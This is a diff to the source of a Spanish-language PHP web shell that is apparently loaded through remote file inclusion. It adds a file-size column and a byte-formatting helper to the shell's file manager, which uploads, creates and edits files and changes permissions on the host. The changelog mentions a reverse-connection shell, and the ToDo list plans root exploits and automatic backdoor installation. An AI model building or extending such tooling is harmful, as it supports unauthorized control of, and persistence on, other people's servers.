@@ -48,12 +48,12 @@
     [+] Muestra un div lateral con información importante
     [+] Agregada shell de conexion inversa
     [+] Agregados los links del menu en una linea abajo
+    [+] Muestra el tamaño de los archivos en el navegador
     
    ToDo:
    [!] Eliminar los mensajes de: "No se puede leer /var/log/messages porque supera los 50000 bytes", o ponerlos como link
    [+] Agregar rootexploits
    [+] Agregar exploits de php
-   [+] Agregar una shell remota tipo datacha0s en varios lenguajes (php, c y perl seguro)
    [+] Agregar backdoorizacion automática
    [+] Agregar descripciones en los textarea e input--> onfocus="this.value=''; this.onfocus=null;"
    [!] Mejorar las funciones para leer y escribir archivos
@@ -344,7 +344,7 @@ echo'
                 document.cookie = "lateral=ON; path=/";
             }
             </script>
-            <img src="?w=img&imagen=derecha" alt=">&gt; &gt;" id="flechaderecha" onclick="ocultar();">
+            <img src="?w=img&imagen=derecha" alt="&gt; &gt;" id="flechaderecha" onclick="ocultar();">
             <img src="?w=img&imagen=izquierda" style="display:none;" id="flechaizquierda" alt="&lt; &lt;" onclick="mostrar();">
         </div>
         
@@ -865,13 +865,13 @@ psybnc.conf
             
             //las tres primeras filas
             echo '<tr><td class="ac"><img src="?w=img&imagen=archivonuevo" class="ai" alt="Archivo nuevo"></td><form action="'.$rfiurl.'w=subir" method="post" enctype="multipart/form-data">
-            <td style="text-align:left;font-size:0px;" colspan="3"><input name="ruta" type="hidden" value="'.htmlentities($ruta,ENT_QUOTES,'UTF-8').'/">
+            <td style="text-align:left;font-size:0px;" colspan="4"><input name="ruta" type="hidden" value="'.htmlentities($ruta,ENT_QUOTES,'UTF-8').'/">
             <input name="ruta2" type="file" style="width:100%;"></td> <td><input type="submit" value="Crear archivo" style="width:100%"></td></form></tr>
             <tr><td class="ac"><img src="?w=img&imagen=archivonuevo" class="ai" alt="Archivo nuevo"></td><form action="'.$rfiurl.'w=editar" method="POST">
-            <td style="text-align:left;font-size:0px;" colspan="3"><input name="ruta" type="hidden" value="'.htmlentities($ruta,ENT_QUOTES,'UTF-8').'/"><input name="ruta2" style="width:100%;" value="archivo.txt"></td>
+            <td style="text-align:left;font-size:0px;" colspan="4"><input name="ruta" type="hidden" value="'.htmlentities($ruta,ENT_QUOTES,'UTF-8').'/"><input name="ruta2" style="width:100%;" value="archivo.txt"></td>
             <td><input type="submit" value="Crear archivo" style="width:100%"></td></form></tr>
             <tr><td class="ac"><img src="?w=img&imagen=carpetanueva" class="ai" alt="Carpeta nuevo"></td><form action="'.$rfiurl.'w=nuevacarpeta" method="POST">
-            <td style="text-align:left;font-size:0px;" colspan="3"><input name="ruta" type="hidden" value="'.htmlentities($ruta,ENT_QUOTES,'UTF-8').'/"><input name="ruta2" style="width:100%;" value="carpeta"></td>
+            <td style="text-align:left;font-size:0px;" colspan="4"><input name="ruta" type="hidden" value="'.htmlentities($ruta,ENT_QUOTES,'UTF-8').'/"><input name="ruta2" style="width:100%;" value="carpeta"></td>
             <td><input type="submit" value="Crear carpeta" style="width:100%"></td></form></tr>';
             
             //mostramos el link a todos los archivos
@@ -1448,6 +1448,9 @@ global $rfiurl;
         $salida = '<img src="'.$rfiurl.'w=img&imagen=archivo" class="ai" alt="Archivo"> '.htmlentities($archivo,ENT_QUOTES,'UTF-8');
     }
     
+
+    $filesize = formatBytes(filesize($ruta.$barra.$archivo));
+    
     if (!$eslink){      //cuando son links no se pone esto
         $perm = permisos($ruta.$barra.$archivo);
         if (is_writable($ruta.$barra.$archivo)){
@@ -1460,7 +1463,7 @@ global $rfiurl;
         $usuario = $data["name"];
         $data = posix_getgrgid(filegroup($ruta.$barra.$archivo));
         $usuario.= ':'.$data["name"];
-        $salida= '<tr>'.$celdaeditar.'<td style="text-align:left;">'.$salida.'</td><td style="text-align:center;">'.htmlentities($usuario,ENT_QUOTES,'UTF-8') .'</td><td style="text-align:right; color:'.$colorpermisos.'"><a href="'.$rfiurl.'w=chmod&ruta='.htmlentities($ruta,ENT_QUOTES,'UTF-8').$barra.htmlentities($archivo,ENT_QUOTES,'UTF-8').'">'.$perm.'</a></td><td style="text-align:right;">'.date("d/m/Y H:i",filectime($ruta.$barra.$archivo)).'</td></tr>'."\n";
+        $salida= '<tr>'.$celdaeditar.'<td style="text-align:left;">'.$salida.'</td><td style="text-align:center;">'.$filesize.'</td><td style="text-align:center;">'.htmlentities($usuario,ENT_QUOTES,'UTF-8') .'</td><td style="text-align:right; color:'.$colorpermisos.'"><a href="'.$rfiurl.'w=chmod&ruta='.htmlentities($ruta,ENT_QUOTES,'UTF-8').$barra.htmlentities($archivo,ENT_QUOTES,'UTF-8').'">'.$perm.'</a></td><td style="text-align:right;">'.date("d/m/Y H:i",filectime($ruta.$barra.$archivo)).'</td></tr>'."\n";
     }
     return $salida;
 }
@@ -1510,6 +1513,35 @@ function permisos($archivo){
                 (($perms & 0x0200) ? 'T' : '-'));
     
     return $info;
+}
+
+//formatea el tamaño de los archivos
+function formatBytes($b,$p = null) {
+    /**
+     *
+     * @author Martin Sweeny
+     * @version 2010.0617
+     *
+     * returns formatted number of bytes.
+     * two parameters: the bytes and the precision (optional).
+     * if no precision is set, function will determine clean
+     * result automatically.
+     *
+     **/
+    $units = array("B","kB","MB","GB","TB","PB","EB","ZB","YB");
+    $c=0;
+    if(!$p && $p !== 0) {
+        foreach($units as $k => $u) {
+            if(($b / pow(1024,$k)) >= 1) {
+                $r["bytes"] = $b / pow(1024,$k);
+                $r["units"] = $u;
+                $c++;
+            }
+        }
+        return number_format($r["bytes"],2) . " " . $r["units"];
+    } else {
+        return number_format($b / pow(1024,$p)) . " " . $units[$p];
+    }
 }
 
 //devuelve el contenido de un archivo
